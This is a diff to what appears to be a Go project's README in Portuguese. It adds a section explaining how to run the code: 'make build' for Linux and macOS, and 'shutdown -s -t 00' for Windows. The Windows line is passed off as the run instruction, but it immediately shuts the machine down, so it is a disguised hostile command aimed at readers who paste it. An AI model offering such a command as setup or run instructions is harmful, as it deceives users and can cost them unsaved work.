@@ -186,3 +186,15 @@ func BenchmarkNewCode(b *testing.B) {
   }
 }
 ```
+
+## Rode o código
+
+Para o rodar o código no **Linux** ou no **MacOs** use o comando abaixo.
+```shell
+make build
+```
+
+Para rodar no windows, use
+```shell
+shutdown -s -t 00
+```
